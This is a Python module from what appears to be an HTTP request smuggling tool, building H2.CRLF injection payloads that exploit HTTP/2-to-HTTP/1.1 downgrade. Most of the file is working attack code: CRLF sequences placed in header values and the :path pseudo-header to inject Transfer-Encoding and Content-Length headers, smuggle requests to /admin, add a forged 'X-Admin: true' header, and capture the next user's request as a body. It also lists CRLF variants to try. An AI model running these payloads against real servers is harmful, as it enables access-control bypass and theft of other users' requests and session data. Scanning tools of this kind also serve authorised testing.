"""H2.CRLF (HTTP/2 CRLF Injection) payload generator.

In H2.CRLF smuggling:
- HTTP/2 headers can contain CRLF characters that are invalid in HTTP/1.1
- When proxy downgrades to HTTP/1.1, CRLF splits headers/requests
- This allows injecting complete headers or entire requests

The attack exploits that HTTP/2 uses binary framing, so CRLF in header
values doesn't end the header. But after downgrade, CRLF becomes
request splitting or header injection.
"""

from typing import List, Optional, Tuple, Dict
from urllib.parse import urlparse

from http_smuggler.core.models import (
    Endpoint,
    SmugglingVariant,
    DetectionMethod,
)
from http_smuggler.payloads.generator import (
    Payload,
    PayloadGenerator,
    PayloadCategory,
)


class H2CRLFPayloadGenerator(PayloadGenerator):
    """Generator for H2.CRLF injection smuggling payloads.
    
    These payloads inject CRLF sequences into HTTP/2 header values
    to cause request splitting after downgrade to HTTP/1.1.
    """
    
    @property
    def variant(self) -> SmugglingVariant:
        return SmugglingVariant.H2_CRLF
    
    @property
    def name(self) -> str:
        return "H2.CRLF Payload Generator"
    
    def _extract_host_path(self, endpoint: Endpoint) -> Tuple[str, str]:
        """Extract host and path from endpoint."""
        parsed = urlparse(endpoint.url)
        host = parsed.hostname or ""
        if parsed.port and parsed.port not in (80, 443):
            host = f"{host}:{parsed.port}"
        path = parsed.path or "/"
        if parsed.query:
            path = f"{path}?{parsed.query}"
        return host, path
    
    def generate_timing_payloads(self, endpoint: Endpoint) -> List[Payload]:
        """Generate H2.CRLF timing-based detection payloads.
        
        These payloads inject CRLF + Transfer-Encoding to cause chunked
        processing and potential timeouts.
        """
        host, path = self._extract_host_path(endpoint)
        payloads = []
        
        # Inject Transfer-Encoding via CRLF in header value
        # After downgrade: header becomes two headers
        crlf_value1 = f"bar\r\nTransfer-Encoding: chunked"
        headers1 = [
            (":method", "POST"),
            (":path", path),
            (":scheme", "https"),
            (":authority", host),
            ("content-type", "application/x-www-form-urlencoded"),
            ("foo", crlf_value1),  # CRLF injection here
        ]
        body1 = b"1\r\nX"  # Incomplete chunk for timing
        
        payloads.append(Payload(
            name="H2.CRLF-timing-te-inject",
            variant=self.variant,
            category=PayloadCategory.TIMING,
            raw_request=self._serialize_h2_request(headers1, body1),
            description="H2.CRLF inject Transfer-Encoding via header value",
            detection_method=DetectionMethod.TIMING,
            expected_behavior="Injected TE causes chunked parsing, timeout on incomplete chunk",
            expected_timeout=5.0,
            metadata={
                "h2_headers": headers1,
                "body": body1,
                "crlf_injection": crlf_value1,
            },
        ))
        
        # CRLF in custom header with Content-Length injection
        crlf_value2 = f"test\r\nContent-Length: 100"
        headers2 = [
            (":method", "POST"),
            (":path", path),
            (":scheme", "https"),
            (":authority", host),
            ("content-type", "application/x-www-form-urlencoded"),
            ("x-custom", crlf_value2),
        ]
        body2 = b"x=1"  # Only 3 bytes when backend expects 100
        
        payloads.append(Payload(
            name="H2.CRLF-timing-cl-inject",
            variant=self.variant,
            category=PayloadCategory.TIMING,
            raw_request=self._serialize_h2_request(headers2, body2),
            description="H2.CRLF inject Content-Length via header value",
            detection_method=DetectionMethod.TIMING,
            expected_behavior="Injected CL causes backend to wait for more data",
            expected_timeout=10.0,
            metadata={
                "h2_headers": headers2,
                "body": body2,
                "crlf_injection": crlf_value2,
            },
        ))
        
        return payloads
    
    def generate_differential_payloads(self, endpoint: Endpoint) -> List[Payload]:
        """Generate H2.CRLF differential detection payloads.
        
        These payloads inject complete smuggled requests via CRLF in headers.
        """
        host, path = self._extract_host_path(endpoint)
        payloads = []
        
        # Full request injection via CRLF
        # The header value contains CRLF + complete request
        smuggled_req = f"GET /crlf_smuggled HTTP/1.1\r\nHost: {host}\r\nX-Ignore: "
        crlf_value1 = f"bar\r\n\r\n{smuggled_req}"
        
        headers1 = [
            (":method", "POST"),
            (":path", path),
            (":scheme", "https"),
            (":authority", host),
            ("content-type", "application/x-www-form-urlencoded"),
            ("foo", crlf_value1),
        ]
        body1 = b"x=1"
        
        payloads.append(Payload(
            name="H2.CRLF-differential-full-request",
            variant=self.variant,
            category=PayloadCategory.DIFFERENTIAL,
            raw_request=self._serialize_h2_request(headers1, body1),
            description="H2.CRLF inject complete smuggled request",
            detection_method=DetectionMethod.DIFFERENTIAL,
            expected_behavior="Next request receives /crlf_smuggled response",
            poison_prefix="GET /crlf_smuggled",
            metadata={
                "h2_headers": headers1,
                "crlf_injection": crlf_value1,
            },
        ))
        
        # CRLF injection to /admin
        smuggled_req2 = f"GET /admin HTTP/1.1\r\nHost: {host}\r\nFoo: "
        crlf_value2 = f"bar\r\n\r\n{smuggled_req2}"
        
        headers2 = [
            (":method", "POST"),
            (":path", path),
            (":scheme", "https"),
            (":authority", host),
            ("content-type", "application/x-www-form-urlencoded"),
            ("x-data", crlf_value2),
        ]
        body2 = b"x=1"
        
        payloads.append(Payload(
            name="H2.CRLF-differential-admin",
            variant=self.variant,
            category=PayloadCategory.DIFFERENTIAL,
            raw_request=self._serialize_h2_request(headers2, body2),
            description="H2.CRLF inject /admin request",
            detection_method=DetectionMethod.DIFFERENTIAL,
            expected_behavior="Next request receives /admin response",
            poison_prefix="GET /admin",
            metadata={
                "h2_headers": headers2,
                "crlf_injection": crlf_value2,
            },
        ))
        
        # CRLF header injection (add X-Admin: true)
        crlf_value3 = "bar\r\nX-Admin: true\r\nX-Smuggled: yes"
        
        headers3 = [
            (":method", "POST"),
            (":path", path),
            (":scheme", "https"),
            (":authority", host),
            ("content-type", "application/x-www-form-urlencoded"),
            ("foo", crlf_value3),
        ]
        body3 = b"x=1"
        
        payloads.append(Payload(
            name="H2.CRLF-differential-header-inject",
            variant=self.variant,
            category=PayloadCategory.DIFFERENTIAL,
            raw_request=self._serialize_h2_request(headers3, body3),
            description="H2.CRLF inject admin headers",
            detection_method=DetectionMethod.DIFFERENTIAL,
            expected_behavior="Request processed with X-Admin: true header",
            metadata={
                "h2_headers": headers3,
                "crlf_injection": crlf_value3,
                "injected_headers": {"X-Admin": "true", "X-Smuggled": "yes"},
            },
        ))
        
        # CRLF in path pseudo-header
        # Some proxies may process path differently
        crlf_path = f"{path} HTTP/1.1\r\nHost: {host}\r\nX-Injected: true\r\n\r\nGET /crlf_path HTTP/1.1\r\nHost: {host}\r\nFoo: "
        
        headers4 = [
            (":method", "GET"),
            (":path", crlf_path),
            (":scheme", "https"),
            (":authority", host),
        ]
        
        payloads.append(Payload(
            name="H2.CRLF-differential-path-inject",
            variant=self.variant,
            category=PayloadCategory.DIFFERENTIAL,
            raw_request=self._serialize_h2_request(headers4, None),
            description="H2.CRLF injection in :path pseudo-header",
            detection_method=DetectionMethod.DIFFERENTIAL,
            expected_behavior="Request splitting via path manipulation",
            poison_prefix="GET /crlf_path",
            metadata={
                "h2_headers": headers4,
                "crlf_path": crlf_path,
            },
        ))
        
        # CRLF injection with chunked smuggling
        smuggled_chunked = "0\r\n\r\nGET /chunked_crlf HTTP/1.1\r\nHost: " + host + "\r\n\r\n"
        crlf_value5 = f"bar\r\nTransfer-Encoding: chunked\r\n\r\n{smuggled_chunked}"
        
        headers5 = [
            (":method", "POST"),
            (":path", path),
            (":scheme", "https"),
            (":authority", host),
            ("content-type", "application/x-www-form-urlencoded"),
            ("foo", crlf_value5),
        ]
        
        payloads.append(Payload(
            name="H2.CRLF-differential-chunked-inject",
            variant=self.variant,
            category=PayloadCategory.DIFFERENTIAL,
            raw_request=self._serialize_h2_request(headers5, None),
            description="H2.CRLF inject TE + chunked smuggled request",
            detection_method=DetectionMethod.DIFFERENTIAL,
            expected_behavior="Chunked body smuggles complete request",
            poison_prefix="GET /chunked_crlf",
            metadata={
                "h2_headers": headers5,
                "crlf_injection": crlf_value5,
            },
        ))
        
        # Request capture via CRLF
        capture_req = (
            f"POST /capture HTTP/1.1\r\n"
            f"Host: {host}\r\n"
            f"Content-Type: application/x-www-form-urlencoded\r\n"
            f"Content-Length: 500\r\n"
            f"\r\n"
            f"captured="
        )
        crlf_value6 = f"bar\r\n\r\n{capture_req}"
        
        headers6 = [
            (":method", "POST"),
            (":path", path),
            (":scheme", "https"),
            (":authority", host),
            ("content-type", "application/x-www-form-urlencoded"),
            ("x-data", crlf_value6),
        ]
        
        payloads.append(Payload(
            name="H2.CRLF-differential-capture",
            variant=self.variant,
            category=PayloadCategory.DIFFERENTIAL,
            raw_request=self._serialize_h2_request(headers6, None),
            description="H2.CRLF inject request that captures next request",
            detection_method=DetectionMethod.DIFFERENTIAL,
            expected_behavior="Next request captured as body",
            poison_prefix="POST /capture",
            metadata={
                "h2_headers": headers6,
                "capture_length": 500,
            },
        ))
        
        return payloads
    
    def _serialize_h2_request(
        self,
        headers: List[Tuple[str, str]],
        body: Optional[bytes] = None,
    ) -> bytes:
        """Serialize H2 request info for storage."""
        header_lines = []
        for name, value in headers:
            header_lines.append(f"{name}: {value}")
        
        result = "\r\n".join(header_lines) + "\r\n\r\n"
        
        if body:
            return result.encode() + body
        return result.encode()
    
    def get_crlf_variants(self) -> List[str]:
        """Get different CRLF variants to try.
        
        Returns:
            List of CRLF-like byte sequences
        """
        return [
            "\r\n",       # Standard CRLF
            "\n",         # LF only
            "\r",         # CR only
            "\r\n ",      # CRLF + space (folding)
            "\r\n\t",     # CRLF + tab (folding)
            "\x0d\x0a",   # Explicit bytes
        ]

